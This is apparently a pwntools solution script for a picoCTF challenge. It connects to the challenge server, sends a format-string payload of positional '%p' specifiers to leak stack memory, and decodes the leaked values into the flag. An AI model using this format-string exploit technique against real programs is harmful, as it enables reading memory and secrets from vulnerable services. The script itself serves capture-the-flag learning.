from pwn import *

HOST, PORT = "saturn.picoctf.net", 64667
r = remote(HOST, PORT)
# r = process('./vuln')

r.recvuntil(b'>> ')
payload = b''
for i in range(10):
    payload += f'%{36 + i}$p'.encode()
r.sendline(payload)
r.recvline()
flag = r.recvline().decode().strip().split('0x')
for x in flag:
    print(bytes.fromhex(x).decode()[::-1], end='')
print()

r.interactive()
